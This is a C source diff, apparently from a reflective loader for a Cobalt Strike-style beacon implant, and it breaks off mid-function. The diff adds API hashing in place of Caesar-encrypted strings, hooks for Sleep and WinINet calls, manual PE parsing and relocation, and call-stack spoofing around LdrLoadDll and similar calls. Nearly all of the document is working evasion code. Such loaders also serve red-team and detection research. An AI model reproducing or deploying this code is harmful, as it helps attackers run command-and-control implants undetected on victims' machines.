-    basicCaesar_Decrypt(5,str_Sleep,32);
-    if(StringCompareA(EntryName,str_Sleep)){ 
-        return get_virtual_Hook_address(raw_beacon_dll, virtual_beacon_dll, Sleep_Hook);
-    }
-    // failed to find a matching hook. Return NULL which will default to xGetProcAddress
+    if( api_hash == SLEEP)
+        return get_virtual_Hook_address(raw_beacon, virtual_beacon, Sleep_Hook);
+    // Winet Hooks
+    if( api_hash == INTERNETOPENA)
+        return get_virtual_Hook_address(raw_beacon, virtual_beacon, InternetOpenA_Hook);
+    if( api_hash == INTERNETCONNECTA)
+        return get_virtual_Hook_address(raw_beacon, virtual_beacon, InternetConnectA_Hook);
+    if( api_hash == HTTPOPENREQUESTA)
+        return get_virtual_Hook_address(raw_beacon, virtual_beacon, HttpOpenRequestA_Hook);
+    if( api_hash == INTERNETREADFILE)
+        return get_virtual_Hook_address(raw_beacon, virtual_beacon, InternetReadFile_Hook);
+    if( api_hash == INTERNETQUERYDATAAVAILABLE)
+        return get_virtual_Hook_address(raw_beacon, virtual_beacon, InternetQueryDataAvailable_Hook);
+    if( api_hash == HTTPSENDREQUESTA)
+        return get_virtual_Hook_address(raw_beacon, virtual_beacon, HttpSendRequestA_Hook);
+    if( api_hash == INTERNETCLOSEHANDLE)
+        return get_virtual_Hook_address(raw_beacon, virtual_beacon, InternetCloseHandle_Hook);
+    if( api_hash == INTERNETQUERYOPTIONA)
+        return get_virtual_Hook_address(raw_beacon, virtual_beacon, InternetQueryOptionA_Hook);
+    if( api_hash == INTERNETSETOPTIONA)
+        return get_virtual_Hook_address(raw_beacon, virtual_beacon, InternetSetOptionA_Hook);
+    if( api_hash == INTERNETSETSTATUSCALLBACK)
+        return get_virtual_Hook_address(raw_beacon, virtual_beacon, InternetSetStatusCallback_Hook);
+    if( api_hash == HTTPADDREQUESTHEADERSA)
+        return get_virtual_Hook_address(raw_beacon, virtual_beacon, HttpAddRequestHeadersA_Hook);
+    if( api_hash == HTTPQUERYINFOA)
+        return get_virtual_Hook_address(raw_beacon, virtual_beacon, HttpQueryInfoA_Hook);
     return NULL;
 }
 
-void doRelocations(APIS * api, Dll * virtual_beacon_dll, Dll * raw_beacon_dll){
-    unsigned __int64 beacon_image_base    = 0;
-    unsigned __int64 BaseAddressDelta     = 0;
-    PIMAGE_DOS_HEADER        raw_beacon_dll_DOS_HEADER      = NULL;
-    PIMAGE_FILE_HEADER       raw_beacon_dll_FILE_HEADER     = NULL;
-    PIMAGE_OPTIONAL_HEADER64 raw_beacon_dll_OPTIONAL_HEADER = NULL;
-    PIMAGE_DATA_DIRECTORY    raw_beacon_dll_data_directory  = NULL;
+void doRelocations(APIS * api, Dll * virtual_beacon, Dll * raw_beacon){
+    ULONG_PTR beacon_image_base    = 0;
+    ULONG_PTR BaseAddressDelta     = 0;
+    PIMAGE_DOS_HEADER        raw_beacon_DOS_HEADER      = NULL;
+    PIMAGE_FILE_HEADER       raw_beacon_FILE_HEADER     = NULL;
+    PIMAGE_OPTIONAL_HEADER64 raw_beacon_OPTIONAL_HEADER = NULL;
+    PIMAGE_DATA_DIRECTORY    raw_beacon_data_directory  = NULL;
     DWORD    BaseRelocationTable_RVA       = 0;
     DWORD    BaseRelocationTable_Size      = 0;
     void*    BaseRelocationTable           = 0;
@@ -437,25 +473,24 @@ void doRelocations(APIS * api, Dll * virtual_beacon_dll, Dll * raw_beacon_dll){
     void* this_relocation_VA = NULL;
     DWORD this_relocBlock_EntriesCount = 0;
      
-     
     // Get the Image base by walking the headers
-    raw_beacon_dll_DOS_HEADER       = (PIMAGE_DOS_HEADER)raw_beacon_dll->dllBase;
-    raw_beacon_dll_FILE_HEADER      = (PIMAGE_FILE_HEADER)(raw_beacon_dll_DOS_HEADER->e_lfanew + (char*)raw_beacon_dll_DOS_HEADER);
-    raw_beacon_dll_OPTIONAL_HEADER  = (PIMAGE_OPTIONAL_HEADER64)(0x18 + (char*)raw_beacon_dll_FILE_HEADER);
-    beacon_image_base               = (unsigned __int64)raw_beacon_dll_OPTIONAL_HEADER->ImageBase;
+    raw_beacon_DOS_HEADER       = (PIMAGE_DOS_HEADER)raw_beacon->dllBase;
+    raw_beacon_FILE_HEADER      = (PIMAGE_FILE_HEADER)(raw_beacon_DOS_HEADER->e_lfanew + (BYTE*)raw_beacon_DOS_HEADER);
+    raw_beacon_OPTIONAL_HEADER  = (PIMAGE_OPTIONAL_HEADER64)(0x18 + (BYTE*)raw_beacon_FILE_HEADER);
+    beacon_image_base               = (ULONG_PTR)raw_beacon_OPTIONAL_HEADER->ImageBase;
     // Get the Base Address difference
-    BaseAddressDelta                = (unsigned __int64)((char*)virtual_beacon_dll->dllBase - beacon_image_base);
+    BaseAddressDelta                = (ULONG_PTR)((BYTE*)virtual_beacon->dllBase - beacon_image_base);
 
     // Get the raw file offset to the Data Directory located in the Optional Header
     // The Data Directory has the RVAs and sizes of all the other tables & directories
-    raw_beacon_dll_data_directory   = (PIMAGE_DATA_DIRECTORY)raw_beacon_dll_OPTIONAL_HEADER->DataDirectory;
+    raw_beacon_data_directory   = (PIMAGE_DATA_DIRECTORY)raw_beacon_OPTIONAL_HEADER->DataDirectory;
 
     // Get the RVA and size of the Base Relocation Table from the Data Directory in the raw beacon DLL Optional Header
-    BaseRelocationTable_RVA   = raw_beacon_dll_data_directory[5].VirtualAddress;
-    BaseRelocationTable_Size  = raw_beacon_dll_data_directory[5].Size;
+    BaseRelocationTable_RVA   = raw_beacon_data_directory[5].VirtualAddress;
+    BaseRelocationTable_Size  = raw_beacon_data_directory[5].Size;
     
     // Setup the loop to start at the first Base Relocation block in the Base Relocation table
-    BaseRelocationTable       = (void*)((char*)virtual_beacon_dll->dllBase + BaseRelocationTable_RVA);
+    BaseRelocationTable       = (void*)((BYTE*)virtual_beacon->dllBase + BaseRelocationTable_RVA);
     this_BaseRelocation = (PIMAGE_BASE_RELOCATION)BaseRelocationTable;
     this_BaseRelocation_VA               = this_BaseRelocation->VirtualAddress;
     this_BaseRelocation_SizeOfBlock      = this_BaseRelocation->SizeOfBlock;
@@ -463,10 +498,10 @@ void doRelocations(APIS * api, Dll * virtual_beacon_dll, Dll * raw_beacon_dll){
     // Loop through and resolve all the block relocation entries in all the block relocations
     // The last block will be all zeros and that's how we know we've reached the end
     while(this_BaseRelocation->VirtualAddress != 0){
-        this_relocation                  = (unsigned short*)((char*)this_BaseRelocation + sizeof(IMAGE_BASE_RELOCATION));
+        this_relocation                  = (unsigned short*)((BYTE*)this_BaseRelocation + sizeof(IMAGE_BASE_RELOCATION));
         this_relocation_RVA              = this_BaseRelocation->VirtualAddress;
         this_BaseRelocation_SizeOfBlock  = this_BaseRelocation->SizeOfBlock;
-        this_relocation_VA               = (void*)((char*)virtual_beacon_dll->dllBase + this_relocation_RVA);
+        this_relocation_VA               = (void*)((BYTE*)virtual_beacon->dllBase + this_relocation_RVA);
         this_relocBlock_EntriesCount     = (this_BaseRelocation_SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / 2; 
     
         // Check that its the correct type and then write the relocation
@@ -492,206 +527,282 @@ void doRelocations(APIS * api, Dll * virtual_beacon_dll, Dll * raw_beacon_dll){
                   "r" (this_relocation_VA),  // RDX IN
                   "r" (BaseAddressDelta)     // RCX IN
             );
-            this_relocation = (unsigned short*)((char*)this_relocation + 2);
+            this_relocation = (unsigned short*)((BYTE*)this_relocation + 2);
         }
         // Now move to the next Base Relocation Block and resolve all of the relocation entries
-        this_BaseRelocation = ((char*)this_BaseRelocation + this_BaseRelocation->SizeOfBlock);
+        this_BaseRelocation = ((BYTE*)this_BaseRelocation + this_BaseRelocation->SizeOfBlock);
     }
 }
 
-/*
-// void* getHook(void* src_rdll.BaseAddr, void* src_rdll.hookAddr, void* dst_rdll.BaseAddr, int raw_vs_virtual_text_section_diff);
-//                            RCX                      RDX                      R8                        R9
-"getHook: \n"
-    "sub rdx, rcx \n"   // RDX = RVA hookAddr = (src_rdll.hookAddr - src_rdll.BaseAddr)
-    "add rdx, r8  \n"   // RDX = dst_rdll.hookAddr = (RVA hookAddr + dst_rdll.BaseAddr)
-    "mov rax, rdx \n"   // return dst_rdll.hookAddr
-    "add rax, r9  \n"   // raw_vs_virtual_text_section_diff
-    "ret \n"
-*/
-
-void* get_virtual_Hook_address(Dll * raw_beacon_dll, Dll * virtual_beacon_dll, void* raw_hook_address)
+void* get_virtual_Hook_address(Dll * raw_beacon, Dll * virtual_beacon, void* raw_hook_address)
 {
-    unsigned int raw_vs_virtual_delta   = 0;
+    DWORD raw_vs_virtual_delta   = 0;
     void* hook_raw_file_offset          = NULL;
     void* hook_relative_virtual_offset  = NULL;
     void* virtual_hook_address          = NULL;
-    unsigned short size_Optional_Header = 0;
-    PIMAGE_DOS_HEADER        raw_beacon_dll_DOS_HEADER      = NULL;
-    PIMAGE_FILE_HEADER       raw_beacon_dll_FILE_HEADER     = NULL;
-    PIMAGE_OPTIONAL_HEADER64 raw_beacon_dll_OPTIONAL_HEADER = NULL;
-    PIMAGE_SECTION_HEADER    raw_beacon_dll_SECTION_HEADER  = NULL;
-     
-    // Get the Section Header
-    raw_beacon_dll_DOS_HEADER       = (PIMAGE_DOS_HEADER)raw_beacon_dll->dllBase;
-    raw_beacon_dll_FILE_HEADER      = (PIMAGE_FILE_HEADER)(raw_beacon_dll_DOS_HEADER->e_lfanew + (char*)raw_beacon_dll_DOS_HEADER);
-    raw_beacon_dll_OPTIONAL_HEADER  = (PIMAGE_OPTIONAL_HEADER64)(0x18 + (char*)raw_beacon_dll_FILE_HEADER);
-    size_Optional_Header            = *(unsigned short*)((char*)raw_beacon_dll_FILE_HEADER + 0x14);
-    raw_beacon_dll_SECTION_HEADER   = (PIMAGE_SECTION_HEADER)add(raw_beacon_dll_OPTIONAL_HEADER, size_Optional_Header);
 
-    raw_vs_virtual_delta         = (unsigned int)(raw_beacon_dll_SECTION_HEADER->VirtualAddress - raw_beacon_dll_SECTION_HEADER->PointerToRawData);
-
-    hook_raw_file_offset         = (void*)((char*)raw_hook_address - (char*)raw_beacon_dll->dllBase);
-
+    raw_vs_virtual_delta         = (DWORD)(raw_beacon->section_header->VirtualAddress - raw_beacon->section_header->PointerToRawData);
+    hook_raw_file_offset         = (void*)((BYTE*)raw_hook_address - (BYTE*)raw_beacon->dllBase);
     hook_relative_virtual_offset = (void*)add(hook_raw_file_offset, raw_vs_virtual_delta);
-
-    virtual_hook_address         = (void*)add(hook_relative_virtual_offset, virtual_beacon_dll->dllBase);
+    virtual_hook_address         = (void*)add(hook_relative_virtual_offset, virtual_beacon->dllBase);
     
     return virtual_hook_address;
 }
 
-void parseDLL(Dll * dll){
-    dll->NewExeHeader         = getNewExeHeader(dll->dllBase);
-    dll->size                 = getDllSize(dll->NewExeHeader);
-    dll->SizeOfHeaders        = getDllSizeOfHeaders(dll->NewExeHeader);
-    dll->OptionalHeader       = getOptionalHeader(dll->NewExeHeader);
-    dll->SizeOfOptionalHeader = getSizeOfOptionalHeader(dll->NewExeHeader);
-    dll->NumberOfSections     = getNumberOfSections(dll->NewExeHeader);
-    dll->Export.Directory     = getExportDirectory(dll->dllBase);
-    dll->Export.DirectorySize = getExportDirectorySize(dll->dllBase);
-    dll->Export.AddressTable  = getExportAddressTable(dll->dllBase, dll->Export.Directory);
-    dll->Export.NameTable     = getExportNameTable(dll->dllBase, dll->Export.Directory);
-    dll->Export.OrdinalTable  = getExportOrdinalTable(dll->dllBase, dll->Export.Directory);
-    dll->Export.NumberOfNames = getNumberOfNames(dll->Export.Directory);
+void get_sections(Dll* module) 
+{
+    BYTE str_text[]  = { '.','t','e','x','t',0     };
+    BYTE str_pdata[] = { '.','p','d','a','t','a',0 };
+
+    for (DWORD i = 0; i < module->file_header->NumberOfSections; ++i) {
+        if (MemoryCompare((BYTE*)module->section_header[i].Name, str_text, sizeof(str_text)))
+        {
+            module->text_section = (void*)((BYTE*)module->dllBase + module->section_header[i].VirtualAddress);
+            module->text_section_size = (DWORD)module->section_header[i].SizeOfRawData;
+        }
+        if (MemoryCompare((BYTE*)module->section_header[i].Name, str_pdata, sizeof(str_pdata)))
+        {
+            module->pdata_section = (void*)((BYTE*)module->dllBase + module->section_header[i].VirtualAddress);
+            module->pdata_section_size = (DWORD)module->section_header[i].SizeOfRawData;
+        }
+    }
+}
+
+void parse_module_headers(Dll* module)
+{
+    module->dos_header            = (PIMAGE_DOS_HEADER)module->dllBase;
+    module->file_header           = (IMAGE_FILE_HEADER *)        ( (BYTE *)module->dllBase + module->dos_header->e_lfanew + 4);
+    module->optional_header       = (IMAGE_OPTIONAL_HEADER64 *)  ( 0x14 + (BYTE*)module->file_header );
+    module->optional_header_size  = (unsigned short)module->file_header->SizeOfOptionalHeader;
+    module->section_header        = (IMAGE_SECTION_HEADER *)     ( (BYTE *)module->optional_header  + module->optional_header_size);
+    module->export_directory      = (IMAGE_EXPORT_DIRECTORY*)((BYTE*)module->dllBase + module->optional_header->DataDirectory[0].VirtualAddress);
+
+    module->size                  = module->optional_header->SizeOfImage;
+    module->SizeOfOptionalHeader  = module->optional_header_size;
+    module->NumberOfSections      = module->file_header->NumberOfSections;
+    module->EntryPoint            = (void*)((BYTE*)module->dllBase + module->optional_header->AddressOfEntryPoint);
+
+    module->data_directory        = module->optional_header->DataDirectory;
+    module->Export.Directory      = (void*)module->export_directory;
+    module->Export.DirectorySize  = module->data_directory[0].Size;
+    module->Export.AddressTable   = (void*)((BYTE*)module->dllBase + module->export_directory->AddressOfFunctions);
+    module->Export.NameTable      = (void*)((BYTE*)module->dllBase + module->export_directory->AddressOfNames);
+    module->Export.OrdinalTable   = (void*)((BYTE*)module->dllBase + module->export_directory->AddressOfNameOrdinals);
+    module->Export.NumberOfNames  = ((DWORD)module->export_directory->NumberOfNames );
+
+    module->import_directory_size = module->data_directory[1].Size;
+    module->import_directory      = ((BYTE*)module->dllBase + module->data_directory[1].VirtualAddress);
+
+    get_sections(module);
 }
 
 void getApis(APIS * api){
-    Dll k32, ntdll;
-        // Get Export Directory and Export Tables for NTDLL.DLL
-    // Original String:   nTDlL.Dll // String Length:     9 // Caesar Chiper Key: 513556 // Chiper String:     hX`BX
-    unsigned char s_ntdll[] = {0x82,0x68,0x58,0x80,0x60,0x42,0x58,0x80,0x80,0x00};
-    basicCaesar_Decrypt(9, s_ntdll, 513556);
-    ntdll.dllBase = getDllBase((char *)s_ntdll);
-    parseDLL(&ntdll);
+    Dll k32   = { 0 };
+    Dll ntdll = { 0 };
+    ntdll.dllBase = loaded_module_base_from_hash( NTDLL    );
+    k32.dllBase   = loaded_module_base_from_hash( KERNEL32 );
+    parse_module_headers( &ntdll );
+    parse_module_headers( &k32   );
 
-    // Get Export Directory and Export Tables for Kernel32.dll
-    // Original String:   kERneL32.dLl // String Length:     12 // Caesar Chiper Key: 1 // Chiper String:     lFSofM43/eMm
-    unsigned char s_k32[] = {0x6c,0x46,0x53,0x6f,0x66,0x4d,0x34,0x33,0x2f,0x65,0x4d,0x6d,0x01};
-    basicCaesar_Decrypt(13, s_k32, 1);
-    k32.dllBase = getDllBase((char *)s_k32);
-    parseDLL(&k32);
-
-    unsigned char kstr1[] = {0x36,0x59,0x4b,0x4e,0x36,0x53,0x4c,0x5c,0x4b,0x5c,0x63,0x2b,0x00};
-    basicCaesar_Decrypt(12, kstr1, 234);
-    api->LoadLibraryA = xGetProcAddress(kstr1, &k32);
-
-    unsigned char ntstr2[] = {0x87,0xad,0x7a,0xa5,0xa5,0xa8,0x9c,0x9a,0xad,0x9e,0x8f,0xa2,0xab,0xad,0xae,0x9a,0xa5,0x86,0x9e,0xa6,0xa8,0xab,0xb2,0x00};
-    basicCaesar_Decrypt(23, ntstr2, 1337);
-    api->pNtAllocateVirtualMemory = xGetProcAddress(ntstr2, &ntdll);
-
-    unsigned char ntstr3[] = {0xc4,0xea,0xc6,0xe8,0xe5,0xea,0xdb,0xd9,0xea,0xcc,0xdf,0xe8,0xea,0xeb,0xd7,0xe2,0xc3,0xdb,0xe3,0xe5,0xe8,0xef,0x00};
-    basicCaesar_Decrypt(22, ntstr3, 1010101110);
-    api->pNtProtectVirtualMemory = xGetProcAddress(ntstr3, &ntdll);
-
-    unsigned char ntstr4[] = {0x23,0x49,0x1b,0x47,0x3a,0x3a,0x2b,0x3e,0x47,0x49,0x4a,0x36,0x41,0x22,0x3a,0x42,0x44,0x47,0x4e,0x00};
-    basicCaesar_Decrypt(19, ntstr4, 13013);
-    api->pNtFreeVirtualMemory = xGetProcAddress(ntstr4, &ntdll);
-
-    char str_LdrLoadDll[] = {0x53,0x6b,0x79,0x53,0x76,0x68,0x6b,0x4b,0x73,0x73,0};
-    basicCaesar_Decrypt(10,str_LdrLoadDll,7);
-    api->LdrLoadDll = xGetProcAddress(str_LdrLoadDll, &ntdll);
-
-    char str_RtlAnsiStringToUnicodeString[] = {0x85,0xa7,0x9f,0x74,0xa1,0xa6,0x9c,0x86,0xa7,0xa5,0x9c,0xa1,0x9a,0x87,0xa2,0x88,0xa1,0x9c,0x96,0xa2,0x97,0x98,0x86,0xa7,0xa5,0x9c,0xa1,0x9a,0};
-    basicCaesar_Decrypt(28,str_RtlAnsiStringToUnicodeString,51);
-    api->RtlAnsiStringToUnicodeString = xGetProcAddress(str_RtlAnsiStringToUnicodeString, &ntdll);
-
-    char str_LdrGetProcedureAddress[] = {0x57,0x6f,0x7d,0x52,0x70,0x7f,0x5b,0x7d,0x7a,0x6e,0x70,0x6f,0x80,0x7d,0x70,0x4c,0x6f,0x6f,0x7d,0x70,0x7e,0x7e,0};
-    basicCaesar_Decrypt(22,str_LdrGetProcedureAddress,11);
-    api->LdrGetProcedureAddress = xGetProcAddress(str_LdrGetProcedureAddress, &ntdll);
-
-    char str_RtlFreeUnicodeString[] = {0xab,0xcd,0xc5,0x9f,0xcb,0xbe,0xbe,0xae,0xc7,0xc2,0xbc,0xc8,0xbd,0xbe,0xac,0xcd,0xcb,0xc2,0xc7,0xc0,0};
-    basicCaesar_Decrypt(20,str_RtlFreeUnicodeString,89);
-    api->RtlFreeUnicodeString = xGetProcAddress(str_RtlFreeUnicodeString, &ntdll);
-    
-    char str_RtlInitAnsiString[] = {0x93,0xb5,0xad,0x8a,0xaf,0xaa,0xb5,0x82,0xaf,0xb4,0xaa,0x94,0xb5,0xb3,0xaa,0xaf,0xa8,0};
-    basicCaesar_Decrypt(17,str_RtlInitAnsiString,65);
-    api->RtlInitAnsiString = xGetProcAddress(str_RtlInitAnsiString, &ntdll);
-
-    char str_NtUnmapViewOfSection[] = {0x8a,0xb0,0x91,0xaa,0xa9,0x9d,0xac,0x92,0xa5,0xa1,0xb3,0x8b,0xa2,0x8f,0xa1,0x9f,0xb0,0xa5,0xab,0xaa,0};
-    basicCaesar_Decrypt(20,str_NtUnmapViewOfSection,60);
-    api->NtUnmapViewOfSection = xGetProcAddress(str_NtUnmapViewOfSection, &ntdll);
-
-    char str_NtQueryVirtualMemory[] = {0xa5,0xcb,0xa8,0xcc,0xbc,0xc9,0xd0,0xad,0xc0,0xc9,0xcb,0xcc,0xb8,0xc3,0xa4,0xbc,0xc4,0xc6,0xc9,0xd0,0};
-    basicCaesar_Decrypt(20,str_NtQueryVirtualMemory,87);
-    api->NtQueryVirtualMemory = xGetProcAddress(str_NtQueryVirtualMemory, &ntdll);
-
-    unsigned char str_LoadLibraryExA[] = {0x59,0x7c,0x6e,0x71,0x59,0x76,0x6f,0x7f,0x6e,0x7f,0x86,0x52,0x85,0x4e,0x00};
-    basicCaesar_Decrypt(14,str_LoadLibraryExA,13);
-    api->LoadLibraryExA = xGetProcAddress(str_LoadLibraryExA, &k32);
-
-    unsigned char str_CreateFileMappingA[] = {0x6f,0x9e,0x91,0x8d,0xa0,0x91,0x72,0x95,0x98,0x91,0x79,0x8d,0x9c,0x9c,0x95,0x9a,0x93,0x6d,0x00};
-    basicCaesar_Decrypt(18,str_CreateFileMappingA,44);
-    api->CreateFileMappingA = xGetProcAddress(str_CreateFileMappingA, &k32);
-
-    unsigned char str_MapViewOfFile[] = {0x70,0x84,0x93,0x79,0x8c,0x88,0x9a,0x72,0x89,0x69,0x8c,0x8f,0x88,0x00};
-    basicCaesar_Decrypt(13,str_MapViewOfFile,35);
-    api->MapViewOfFile = xGetProcAddress(str_MapViewOfFile, &k32);
-
-    unsigned char str_RtlAllocateHeap[] = {0x85,0xa7,0x9f,0x74,0x9f,0x9f,0xa2,0x96,0x94,0xa7,0x98,0x7b,0x98,0x94,0xa3,0x00};
-    basicCaesar_Decrypt(15,str_RtlAllocateHeap,51);
-    api->HeapAlloc = xGetProcAddress(str_RtlAllocateHeap, &ntdll);
-
-    unsigned char str_GetProcessHeap[] = {0x56,0x74,0x83,0x5f,0x81,0x7e,0x72,0x74,0x82,0x82,0x57,0x74,0x70,0x7f,0x00};
-    basicCaesar_Decrypt(14,str_GetProcessHeap,15);
-    api->GetProcessHeap = xGetProcAddress(str_GetProcessHeap, &k32);
-
-    
+    api->pNtAllocateVirtualMemory     = xGetProcAddress_hash( NTALLOCATEVIRTUALMEMORY      , &ntdll  );
+    api->pNtProtectVirtualMemory      = xGetProcAddress_hash( NTPROTECTVIRTUALMEMORY       , &ntdll  );
+    api->pNtFreeVirtualMemory         = xGetProcAddress_hash( NTFREEVIRTUALMEMORY          , &ntdll  );
+    api->LdrLoadDll                   = xGetProcAddress_hash( LDRLOADDLL                   , &ntdll  );
+    api->RtlAnsiStringToUnicodeString = xGetProcAddress_hash( RTLANSISTRINGTOUNICODESTRING , &ntdll  );
+    api->LdrGetProcedureAddress       = xGetProcAddress_hash( LDRGETPROCEDUREADDRESS       , &ntdll  );
+    api->RtlFreeUnicodeString         = xGetProcAddress_hash( RTLFREEUNICODESTRING         , &ntdll  );
+    api->RtlInitAnsiString            = xGetProcAddress_hash( RTLINITANSISTRING            , &ntdll  );
+    api->NtUnmapViewOfSection         = xGetProcAddress_hash( NTUNMAPVIEWOFSECTION         , &ntdll  );
+    api->NtQueryVirtualMemory         = xGetProcAddress_hash( NTQUERYVIRTUALMEMORY         , &ntdll  );
+    api->LoadLibraryExA               = xGetProcAddress_hash( LOADLIBRARYEXA               , &k32    );
+    api->CreateFileMappingA           = xGetProcAddress_hash( CREATEFILEMAPPINGA           , &k32    );
+    api->MapViewOfFile                = xGetProcAddress_hash( MAPVIEWOFFILE                , &k32    );
 }
-void * xLoadLibrary(void * library_name){
+
+void getHeapApis(HEAP_APIS * api)
+{
+    Dll k32   = { 0 };
+    Dll ntdll = { 0 };
+    ntdll.dllBase = loaded_module_base_from_hash( NTDLL    );
+    k32.dllBase   = loaded_module_base_from_hash( KERNEL32 );
+    parse_module_headers( &ntdll );
+    parse_module_headers( &k32   );
+
+    api->GetProcessHeap = xGetProcAddress_hash( GETPROCESSHEAP,  &k32    );
+    api->HeapFree       = xGetProcAddress_hash( HEAPFREE,        &k32    );
+    api->HeapAlloc      = xGetProcAddress_hash( HEAPALLOC,       &k32    );
+}
+
+void * xLoadLibrary(void * library_name)
+{
     // Check if the DLL is already loaded and the entry exists in the PEBLdr
-    void* LibraryAddress = getDllBase(library_name);
+    void* LibraryAddress = (void*)loaded_module_base_from_hash(hash_ascii_string(library_name));
     // If the DLL is not already loaded into process memory, use LoadLibraryA to load the imported module into memory
     if (LibraryAddress == NULL){
-        APIS api;
-        ANSI_STRING    ANSI_Library_Name;
-        UNICODE_STRING UNICODE_Library_Name;
+        APIS           api                   = { 0 };
+        ANSI_STRING    ANSI_Library_Name     = { 0 };
+        UNICODE_STRING UNICODE_Library_Name  = { 0 };
+        Spoof_Struct   spoof_struct          = { 0 }; 
 
-        RtlSecureZeroMemory( &api,                  sizeof( APIS ) );
-        RtlSecureZeroMemory( &ANSI_Library_Name,    sizeof( ANSI_Library_Name ) );
-        RtlSecureZeroMemory( &UNICODE_Library_Name, sizeof( UNICODE_Library_Name ) );
+        setup_synthetic_callstack(&spoof_struct);
 
         getApis(&api);
 
         // Change ASCII string to ANSI struct string
-        api.RtlInitAnsiString(&ANSI_Library_Name,library_name);
+        spoof_synthetic_callstack(
+            &ANSI_Library_Name,            // Argument # 1
+            library_name,                  // Argument # 2
+            NULL,                          // Argument # 3
+            NULL,                          // Argument # 4
+            &spoof_struct,                 // Pointer to Spoof Struct 
+            api.RtlInitAnsiString,         // Pointer to API Call
+            (void *)0                      // Number of Arguments on Stack (Args 5+)
+        ); 
+        // api.RtlInitAnsiString(&ANSI_Library_Name,library_name);
         // RtlAnsiStringToUnicodeString converts the given ANSI source string into a Unicode string.
         // 3rd arg = True = routine should allocate the buffer space for the destination string. the caller must deallocate the buffer by calling RtlFreeUnicodeString.
-        api.RtlAnsiStringToUnicodeString( &UNICODE_Library_Name, &ANSI_Library_Name, TRUE );
+        spoof_synthetic_callstack(
+            &UNICODE_Library_Name,            // Argument # 1
+            &ANSI_Library_Name,               // Argument # 2
+            TRUE,                             // Argument # 3
+            NULL,                             // Argument # 4
+            &spoof_struct,                    // Pointer to Spoof Struct 
+            api.RtlAnsiStringToUnicodeString, // Pointer to API Call
+            (void *)0                         // Number of Arguments on Stack (Args 5+)
+        ); 
+        // api.RtlAnsiStringToUnicodeString( &UNICODE_Library_Name, &ANSI_Library_Name, TRUE );
 
-        api.LdrLoadDll(NULL, 0,&UNICODE_Library_Name,&LibraryAddress);
+        spoof_synthetic_callstack(
+            NULL,                    // Argument # 1
+            0,                       // Argument # 2
+            &UNICODE_Library_Name,   // Argument # 3
+            &LibraryAddress,         // Argument # 4
+            &spoof_struct,           // Pointer to Spoof Struct 
+            api.LdrLoadDll,          // Pointer to API Call
+            (void *)0                // Number of Arguments on Stack (Args 5+)
+        ); 
+        // api.LdrLoadDll(NULL, 0,&UNICODE_Library_Name,&LibraryAddress);
         // cleanup
-        api.RtlFreeUnicodeString( &UNICODE_Library_Name );
+        spoof_synthetic_callstack(
+            &UNICODE_Library_Name,    // Argument # 1
+            NULL,                     // Argument # 2
+            NULL,                     // Argument # 3
+            NULL,                     // Argument # 4
+            &spoof_struct,            // Pointer to Spoof Struct 
+            api.RtlFreeUnicodeString, // Pointer to API Call
+            (void *)0                 // Number of Arguments on Stack (Args 5+)
+        ); 
+        // api.RtlFreeUnicodeString( &UNICODE_Library_Name );
     }
     return LibraryAddress;
 }
 
-void * xGetProcAddress(void * symbolStr, Dll * dll) {
-    unsigned __int64 StrSize = (unsigned __int64)( (char*)StringLengthA((char*)symbolStr) + 1);
-    void * address = getSymbolAddress(symbolStr, StrSize, dll->dllBase, dll->Export.AddressTable, dll->Export.NameTable, dll->Export.OrdinalTable, dll->Export.NumberOfNames);
+void * resolve_api_address_from_hash(DWORD api_hash, Dll * module)
+{
+    DWORD i = 0;
+    DWORD* names;
+    unsigned short* ordinals;
+    DWORD* functions;
+    BYTE* export_name;
+ 
+    // Get function arrays
+    names = (DWORD*)module->Export.NameTable;
+    ordinals = (unsigned short*)module->Export.OrdinalTable;
+    functions = (DWORD*)module->Export.AddressTable;
 
-    if (!address){
-        APIS api;
-        Dll ntdll;
-        ANSI_STRING ANSI_Function_string;
-        void* hModule;
-        RtlSecureZeroMemory( &ANSI_Function_string, sizeof( ANSI_STRING ) );
-
-        unsigned char s_ntdll[] = {0x82,0x68,0x58,0x80,0x60,0x42,0x58,0x80,0x80,0x00};
-        basicCaesar_Decrypt(9, s_ntdll, 513556);
-        ntdll.dllBase = getDllBase((char *)s_ntdll);
-        parseDLL(&ntdll);
-        char str_LdrGetProcedureAddress[] = {0x57,0x6f,0x7d,0x52,0x70,0x7f,0x5b,0x7d,0x7a,0x6e,0x70,0x6f,0x80,0x7d,0x70,0x4c,0x6f,0x6f,0x7d,0x70,0x7e,0x7e,0};
-        basicCaesar_Decrypt(22,str_LdrGetProcedureAddress,11);
-        api.LdrGetProcedureAddress = getSymbolAddress(str_LdrGetProcedureAddress, 23, ntdll.dllBase, ntdll.Export.AddressTable, ntdll.Export.NameTable, ntdll.Export.OrdinalTable, ntdll.Export.NumberOfNames);
-
-        char str_RtlInitAnsiString[] = {0x93,0xb5,0xad,0x8a,0xaf,0xaa,0xb5,0x82,0xaf,0xb4,0xaa,0x94,0xb5,0xb3,0xaa,0xaf,0xa8,0};
-        basicCaesar_Decrypt(17,str_RtlInitAnsiString,65);
-        api.RtlInitAnsiString = getSymbolAddress(str_RtlInitAnsiString, 18, ntdll.dllBase, ntdll.Export.AddressTable, ntdll.Export.NameTable, ntdll.Export.OrdinalTable, ntdll.Export.NumberOfNames);
-
-        api.RtlInitAnsiString(&ANSI_Function_string,symbolStr);
-        api.LdrGetProcedureAddress(dll->dllBase,&ANSI_Function_string,NULL,&address);
+    // Loop over the names
+    for (i = 0; i < module->Export.NumberOfNames; i++) {
+        export_name = (BYTE*)(module->dllBase + names[i]);
+        DWORD export_hash = hash_ascii_string(export_name);
+        if (export_hash == api_hash)
+        {
+            return module->dllBase + functions[ordinals[i]];
+        }
     }
-    return address;
+    return 0;
+}
+
+void * xGetProcAddress_hash(DWORD api_hash, Dll * module) 
+{
+    Dll ntdll     = { 0 };
+    ntdll.dllBase = loaded_module_base_from_hash( NTDLL );
+    parse_module_headers(&ntdll);
+
+    tNtQueryVirtualMemory NtQueryVirtualMemory = resolve_api_address_from_hash( NTQUERYVIRTUALMEMORY , &ntdll );
+
+    void * api_address = resolve_api_address_from_hash( api_hash , module );
+
+    MEMORY_INFORMATION_CLASS mic = { 0 };
+    MEMORY_BASIC_INFORMATION mbi = { 0 };
+    long status = NtQueryVirtualMemory(NtCurrentProcess(), (PVOID)api_address, mic, &mbi, sizeof(mbi), NULL);
+
+    if (mbi.Protect != 0x10 && mbi.Protect != 0x20 && mbi.Protect != 0x40 && mbi.Protect != 0x80)
+    {
